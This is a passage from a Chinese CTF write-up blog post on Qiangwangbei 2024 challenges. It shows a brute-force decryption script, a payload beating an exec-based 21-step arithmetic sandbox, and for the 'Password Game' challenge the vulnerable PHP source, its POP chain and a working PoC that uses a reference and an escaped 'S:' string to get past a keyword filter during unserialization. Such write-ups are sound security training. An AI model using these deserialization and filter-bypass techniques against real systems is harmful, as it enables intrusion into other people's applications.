<span class="number">0xaa</span>, <span class="number">0x90</span>, <span class="number">0xa9</span>, <span class="number">0x51</span>,</span><br><span class="line">        <span class="number">0xd0</span>, <span class="number">0xb6</span>, <span class="number">0xc6</span>, <span class="number">0x34</span>, <span class="number">0xfc</span>, <span class="number">0xa0</span>, <span class="number">0xb3</span>, <span class="number">0x35</span>,</span><br><span class="line">        <span class="number">0xea</span>, <span class="number">0x7</span>, <span class="number">0xa4</span>, <span class="number">0x22</span>, <span class="number">0x80</span>, <span class="number">0x6d</span>, <span class="number">0x81</span>, <span class="number">0x57</span>,</span><br><span class="line">        <span class="number">0x87</span>, <span class="number">0x25</span>, <span class="number">0xc7</span>, <span class="number">0x4c</span>, <span class="number">0xd6</span>, <span class="number">0xce</span>, <span class="number">0x77</span>, <span class="number">0xd7</span>,</span><br><span class="line">        <span class="number">0xad</span>, <span class="number">0x78</span>, <span class="number">0x7a</span>, <span class="number">0x85</span>, <span class="number">0xa1</span>, <span class="number">0xf3</span>, <span class="number">0xe8</span>, <span class="number">0x5c</span>,</span><br><span class="line">        <span class="number">0x73</span>, <span class="number">0x48</span>, <span class="number">0xda</span>, <span class="number">0x31</span>, <span class="number">0x4e</span>, <span class="number">0x2d</span>, <span class="number">0x93</span>, <span class="number">0x16</span>,</span><br><span class="line">        <span class="number">0x2</span>, <span class="number">0x70</span>, <span class="number">0x1d</span>, <span class="number">0xfb</span>, <span class="number">0xcd</span>, <span class="number">0xe3</span>, <span class="number">0xf7</span>, <span class="number">0x64</span>,</span><br><span class="line">        <span class="number">0xf9</span>, <span class="number">0xc5</span>, <span class="number">0x8</span>, <span class="number">0x9e</span>, <span class="number">0x95</span>, <span class="number">0x2b</span>, <span class="number">0xe4</span>, <span class="number">0x20</span>,</span><br><span class="line">        <span class="number">0xd1</span>, <span class="number">0xfd</span>, <span class="number">0x7c</span>, <span class="number">0x2f</span>, <span class="number">0xbe</span>, <span class="number">0xb9</span>, <span class="number">0xdb</span>, <span class="number">0xde</span>,</span><br><span class="line">        <span class="number">0xe7</span>, <span class="number">0xd9</span>, <span class="number">0x3b</span>, <span class="number">0xeb</span>, <span class="number">0xff</span>, <span class="number">0xb7</span>, <span class="number">0xca</span>, <span class="number">0xb4</span>,</span><br><span class="line">        <span class="number">0x5</span>, <span class="number">0xc0</span>, <span class="number">0xab</span>, <span class="number">0xcf</span>, <span class="number">0xed</span>, <span class="number">0x6c</span>, <span class="number">0x8d</span>, <span class="number">0x59</span></span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line">    v7 = <span class="number">0</span></span><br><span class="line">    v8 = <span class="number">0</span></span><br><span class="line">    v14 = <span class="built_in">bytearray</span>(<span class="number">256</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">22</span>):</span><br><span class="line">        v12 = SBox[v7 + <span class="number">1</span>]</span><br><span class="line">        v8 += v12</span><br><span class="line">        SBox[v7], SBox[v8] = SBox[v8], SBox[v7]</span><br><span class="line">        v3 = ((input_bytes[j + <span class="number">5</span>] &lt;&lt; <span class="number">7</span>) | (input_bytes[j + <span class="number">5</span>] &gt;&gt; <span class="number">1</span>)) &lt;&lt; <span class="number">6</span></span><br><span class="line">        v3 ^= <span class="number">0x0FFFFFFC0</span></span><br><span class="line">        v3 |= ((input_bytes[j + <span class="number">5</span>] &lt;&lt; <span class="number">7</span>) | (input_bytes[j + <span class="number">5</span>] &gt;&gt; <span class="number">1</span>)) &amp; <span class="number">0xff</span> &gt;&gt; <span class="number">2</span></span><br><span class="line">        v3 ^= <span class="number">0x3B</span></span><br><span class="line">        v3 ^= <span class="number">0x0FFFFFFBE</span></span><br><span class="line">        temp = ((v3 &lt;&lt; <span class="number">5</span>) | (v3 &gt;&gt; <span class="number">3</span>)) ^ <span class="number">0xFFFFFFAD</span> &amp; <span class="number">0xff</span></span><br><span class="line">        temp2 = ((temp &lt;&lt; <span class="number">4</span>) | (temp &gt;&gt; <span class="number">4</span>)) ^ <span class="number">0x0FFFFFFDE</span> &amp; <span class="number">0xff</span></span><br><span class="line">        temp3 = (temp2 &lt;&lt; <span class="number">3</span>) | (temp2 &gt;&gt; <span class="number">5</span>)</span><br><span class="line">        v14[j] = SBox[(SBox[v7] + v12) &amp; <span class="number">0xff</span>] ^ deadbeef[j &amp; <span class="number">3</span>] ^ temp3</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">22</span>):</span><br><span class="line">        v14[i] ^= xor</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> v14[:<span class="number">22</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bomp</span>():</span><br><span class="line">    input_bytes = <span class="built_in">bytearray</span>(<span class="string">&quot;flag&#123;*********************&#125;&quot;</span>, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    result = <span class="built_in">bytearray</span>([</span><br><span class="line">        <span class="number">0xC4</span>, <span class="number">0xEE</span>, <span class="number">0x3C</span>, <span class="number">0xBB</span>, <span class="number">0xE7</span>, <span class="number">0xFD</span>, <span class="number">0x67</span>, <span class="number">0x1D</span>,</span><br><span class="line">        <span class="number">0xF8</span>, <span class="number">0x97</span>, <span class="number">0x68</span>, <span class="number">0x9D</span>, <span class="number">0x0B</span>, <span class="number">0x7F</span>, <span class="number">0xC7</span>, <span class="number">0x80</span>,</span><br><span class="line">        <span class="number">0xDF</span>, <span class="number">0xF9</span>, <span class="number">0x4B</span>, <span class="number">0xA0</span>, <span class="number">0x46</span>, <span class="number">0x91</span></span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line">    result[<span class="number">7</span>], result[<span class="number">11</span>] = result[<span class="number">11</span>], result[<span class="number">7</span>]</span><br><span class="line">    result[<span class="number">12</span>], result[<span class="number">16</span>] = result[<span class="number">16</span>], result[<span class="number">12</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">22</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">                input_bytes[<span class="number">5</span> + i] = j</span><br><span class="line">                encrypted = enc(input_bytes, k)</span><br><span class="line">                <span class="keyword">if</span> result[i] == encrypted[i]:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="built_in">chr</span>(j), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;?&quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">bomp()</span><br></pre></td></tr></table></figure>

<h2 id="21-steps"><a href="#21-steps" class="headerlink" title="21_steps"></a>21_steps</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> flag</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;Can you weight a 128 bits number in 21 steps&#x27;</span>)</span><br><span class="line">pattern = <span class="string">r&#x27;([AB]|\d+)=([AB]|\d+)(\+|\-|\*|//|&lt;&lt;|&gt;&gt;|&amp;|\^|%)([AB]|\d+)&#x27;</span></span><br><span class="line"></span><br><span class="line">command = <span class="built_in">input</span>().strip()</span><br><span class="line"><span class="keyword">assert</span> command[-<span class="number">1</span>] == <span class="string">&#x27;;&#x27;</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">all</span>([re.fullmatch(pattern, i) <span class="keyword">for</span> i <span class="keyword">in</span> command[:-<span class="number">1</span>].split(<span class="string">&#x27;;&#x27;</span>)])</span><br><span class="line"></span><br><span class="line">step = <span class="number">21</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> command[:-<span class="number">1</span>].split(<span class="string">&#x27;;&#x27;</span>):</span><br><span class="line">    t = i.translate(<span class="built_in">str</span>.maketrans(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;=AB0123456789&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> t <span class="keyword">in</span> [<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;&lt;&lt;&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;^&#x27;</span>]:</span><br><span class="line">        step -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> t <span class="keyword">in</span> [<span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;%&#x27;</span>]:</span><br><span class="line">        step -= <span class="number">3</span></span><br><span class="line"><span class="keyword">if</span> step &lt; <span class="number">0</span>:exit()</span><br><span class="line"></span><br><span class="line">success = <span class="number">0</span></span><br><span class="line">w = <span class="keyword">lambda</span> x: <span class="built_in">sum</span>([<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>(<span class="built_in">bin</span>(x)[<span class="number">2</span>:])])</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    A = random.randrange(<span class="number">0</span>, <span class="number">2</span>**<span class="number">128</span>)</span><br><span class="line">    wa = w(A)</span><br><span class="line">    B = <span class="number">0</span></span><br><span class="line">    <span class="keyword">try</span> : <span class="built_in">exec</span>(<span class="string">&quot;global A; global B;&quot;</span> + command)</span><br><span class="line">    <span class="keyword">except</span> : exit()</span><br><span class="line">    <span class="keyword">if</span> A == wa:</span><br><span class="line">        success += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> success == <span class="number">100</span>:</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>先是搞了一个白名单，然后这里继续看规则</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">step = <span class="number">21</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> command[:-<span class="number">1</span>].split(<span class="string">&#x27;;&#x27;</span>):</span><br><span class="line">    t = i.translate(<span class="built_in">str</span>.maketrans(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;=AB0123456789&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> t <span class="keyword">in</span> [<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;&lt;&lt;&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;^&#x27;</span>]:</span><br><span class="line">        step -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> t <span class="keyword">in</span> [<span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;%&#x27;</span>]:</span><br><span class="line">        step -= <span class="number">3</span></span><br><span class="line"><span class="keyword">if</span> step &lt; <span class="number">0</span>:exit()</span><br></pre></td></tr></table></figure>

<ul>
<li>如果操作符是 <code>&gt;&gt;</code>、<code>&lt;&lt;</code>、<code>+</code>、<code>-</code>、<code>&amp;</code> 或 <code>^</code>，则将 <code>step</code> 减少1。</li>
<li>如果操作符是 <code>*</code>、<code>/</code> 或 <code>%</code>，则将 <code>step</code> 减少3。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">success = 0</span><br><span class="line">w = lambda x: sum([int(i) for i in list(bin(x)[2:])])</span><br><span class="line">for _ in range(100):</span><br><span class="line">    A = random.randrange(0, 2**128)</span><br><span class="line">    wa = w(A)</span><br><span class="line">    B = 0</span><br><span class="line">    try : exec(&quot;global A; global B;&quot; + command)</span><br><span class="line">    except : exit()</span><br><span class="line">    if A == wa:</span><br><span class="line">        success += 1</span><br></pre></td></tr></table></figure>

<p>这段代码的目的是在循环中随机生成128位的数 <code>A</code>，计算其汉明重量，只要进行100次的循环都成功即可，构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">B=A&gt;&gt;1;</span><br><span class="line">B=B&amp;113427455640312821154458202477256070485;</span><br><span class="line">A=A-B;</span><br><span class="line">B=A&amp;68056473384187692692674921486353642291;</span><br><span class="line">A=A&gt;&gt;2;</span><br><span class="line">A=A&amp;68056473384187692692674921486353642291;</span><br><span class="line">A=A+B;</span><br><span class="line">B=A&gt;&gt;4;</span><br><span class="line">A=A+B;</span><br><span class="line">A=A&amp;20016609818878733144904388672456953615;</span><br><span class="line">B=A&gt;&gt;8;</span><br><span class="line">A=A+B;</span><br><span class="line">B=A&gt;&gt;16;</span><br><span class="line">A=A+B;</span><br><span class="line">B=A&gt;&gt;32;</span><br><span class="line">A=A+B;</span><br><span class="line">B=A&gt;&gt;64;</span><br><span class="line">A=A+B;</span><br><span class="line">A=A&amp;127;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@dkcjbRCL8kgaNGz:~# nc 39.106.63.28 32807</span><br><span class="line">Can you weight a 128 bits number in 21 steps</span><br><span class="line">B=A&gt;&gt;1;B=B&amp;113427455640312821154458202477256070485;A=A-B;B=A&amp;68056473384187692692674921486353642291;A=A&gt;&gt;2;A=A&amp;68056473384187692692674921486353642291;A=A+B;B=A&gt;&gt;4;A=A+B;A=A&amp;20016609818878733144904388672456953615;B=A&gt;&gt;8;A=A+B;B=A&gt;&gt;16;A=A+B;B=A&gt;&gt;32;A=A+B;B=A&gt;&gt;64;A=A+B;A=A&amp;127;</span><br><span class="line">flag&#123;you_can_weight_it_in_21_steps!&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Password-Game"><a href="#Password-Game" class="headerlink" title="Password Game"></a>Password Game</h2><p>您不满足 Rule 1: 请至少包含数字和大小写字母</p>
<p>1Ab</p>
<p>您不满足 Rule 2: 密码中所有数字之和必须为18的倍数</p>
<p>18Qa</p>
<p>Rule 2: 密码中所有数字之和必须为30的倍数</p>
<p>540Qa</p>
<p>您不满足 Rule 2: 密码中所有数字之和必须为20的倍数</p>
<p>5150Qa</p>
<p>您不满足 Rule 2: 密码中所有数字之和必须为28的倍数</p>
<p>54019Qa</p>
<p>密码中所有数字之和必须为12的倍数</p>
<p>54519Qa</p>
<p>您不满足 Rule 2: 密码中所有数字之和必须为14的倍数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;2024qwb&quot;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&quot;|&quot;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&quot;nonono&quot;</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">guest</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username==<span class="string">&quot;guest&quot;</span>)&#123;</span><br><span class="line">            <span class="variable">$value</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username==<span class="title function_ invoke__">md5</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;flag&quot;</span>]))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$GLOBALS</span>[<span class="string">&quot;flag&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">root</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$this</span>-&gt;username, <span class="string">&quot;admin&quot;</span>) == <span class="number">0</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;value == <span class="string">&quot;2024qwb&quot;</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;value = <span class="variable">$GLOBALS</span>[<span class="string">&quot;flag&quot;</span>];</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="string">&quot;hello:&quot;</span>.<span class="variable">$this</span>-&gt;value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="title function_ invoke__">md5</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;flag&quot;</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;password-&gt;<span class="title function_ invoke__">guess</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$this</span>-&gt;username, <span class="string">&quot;admin&quot;</span>) == <span class="number">0</span> )&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hello&quot;</span>.<span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user</span>=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>]));</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$user</span>-&gt;username, <span class="string">&quot;admin&quot;</span>) == <span class="number">0</span> &amp;&amp; <span class="variable">$user</span>-&gt;password == <span class="string">&quot;2024qwb&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>pop链子</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user::destruct-&gt;guest::toString-&gt;user::invoke-&gt;guest::call</span><br></pre></td></tr></table></figure>

<p>但是写了一下好像是打不通的</p>
<hr>
<p>看了朋友的wp同时和大家交流发现可以这么打通，首先，要求哪里不一定非要写脚本打，可以直接抓包拿到源码，拿到源码之后再次分析链子，发现还是不够会想，一般的反序列化头头都是destruct</p>
<p>而这里是<code>get</code>，如何进入呢</p>
<p><img src="/../images/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/QQ20241104-172208.png" alt="1"></p>
<p>那也就是我们只要被解析的最外面的类没有<code>password</code>就可以进入<code>get</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root::get-&gt;user::destruct</span><br></pre></td></tr></table></figure>

<p>写个<code>poc</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">root</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">root</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;username=<span class="keyword">new</span> <span class="title function_ invoke__">user</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;username-&gt;username=<span class="string">&quot;2024qwb&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;value=&amp;<span class="variable">$a</span>-&gt;username-&gt;username;</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;s:7:&quot;2024qwb&quot;&#x27;</span>,<span class="string">&#x27;S:7:&quot;2024\\71wb&quot;&#x27;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br></pre></td></tr></table></figure>

<p>引用赋值两个值都会改变(<del>好久没用快忘了</del>)，记得换成<code>S</code>，不然无效，不清楚过程的可以调试一下</p>
<h1 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h1><p>web题主要就是卡在了路由的地方，代审的题目呢，不是很简单，黑盒呢，测得非常难受，不过一有回显我就会非常激动哈哈，开心:happy:</p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="reward-container">
  <div>Buy me a coffee</div>
  <button>
    Donate
  </button>
  <div class="post-reward">
      <div>
        <img src="/images/wechat.png" alt="baozongwi reward">
        <span>reward</span>
      </div>

  </div>
</div>

          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>Post author:  </strong>baozongwi
  </li>
  <li class="post-copyright-link">
      <strong>Post link: </strong>
      <a href="https://baozongwi.xyz/posts/7e4f569e.html" title="强网杯2024">https://baozongwi.xyz/posts/7e4f569e.html</a>
  </li>
  <li class="post-copyright-license">
      <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
  </li>
</ul>
</div>

          <div class="post-tags">
              <a href="/tags/php/" rel="tag"># php</a>
              <a href="/tags/flask/" rel="tag"># flask</a>
              <a href="/tags/go/" rel="tag"># go</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/posts/78e6c806.html" rel="prev" title="2024\11_计划">
                  <i class="fa fa-angle-left"></i> 2024\11_计划
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/posts/8f7d86ee.html" rel="next" title="CDUCTF2024">
                  CDUCTF2024 <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 2024 – 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">baozongwi</span>
  </div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="Word count total">3.1m</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">87:21</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>

</body>
</html>
